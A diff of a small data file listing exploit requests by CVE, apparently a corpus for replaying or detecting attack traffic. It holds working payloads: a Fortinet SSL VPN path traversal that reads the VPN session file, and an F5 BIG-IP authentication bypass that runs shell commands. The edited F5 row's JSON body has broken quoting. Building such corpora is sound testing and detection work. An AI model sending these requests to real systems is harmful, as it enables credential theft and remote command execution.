@@ -1,7 +1,3 @@
 cve|method|path|query_string|headers|post_data|files|source
-CVE-2018-13379|GET|/remote/fgt_lang|lang=/../../../..//////////dev/cmdb/sslvpn_websession|{"User-Agent": "Mozilla/5.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Connection": "close", "Upgrade-Insecure-Requests": "1"}||https://github.com/milo2012/CVE-2018-13379/blob/master/CVE-2018-13379.py
-CVE-2022-1388|POST|/mgmt/tm/util/bash||{'Host': '127.0.0.1', 'Authorization': 'Basic YWRtaW46aG9yaXpvbjM=', 'X-F5-Auth-Token': 'asdf', 'Connection': 'X-F5-Auth-Token', 'Content-Type': 'application/json' }|{"command":"run","utilCmdArgs":"-c 'whoami'")}|https://github.com/horizon3ai/CVE-2022-1388
-CVE-2023-34362|POST|/guestaccess.aspx|||||https://github.com/horizon3ai/CVE-2023-34362/blob/master/CVE-2023-34362.py
-
-
-
+CVE-2022-1388|POST|/mgmt/tm/util/bash||{"Host": "127.0.0.1", "Authorization": "Basic YWRtaW46aG9yaXpvbjM=", "X-F5-Auth-Token": "asdf", "Connection": "X-F5-Auth-Token", "Content-Type": "application/json" }|{"command":"run","utilCmdArgs":"-c "whoami""}||https://github.com/horizon3ai/CVE-2022-1388
+CVE-2018-13379|GET|/remote/fgt_lang|lang=/../../../..//////////dev/cmdb/sslvpn_websession|{"User-Agent": "Mozilla/5.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Connection": "close", "Upgrade-Insecure-Requests": "1"}|||https://github.com/milo2012/CVE-2018-13379/blob/master/CVE-2018-13379.py
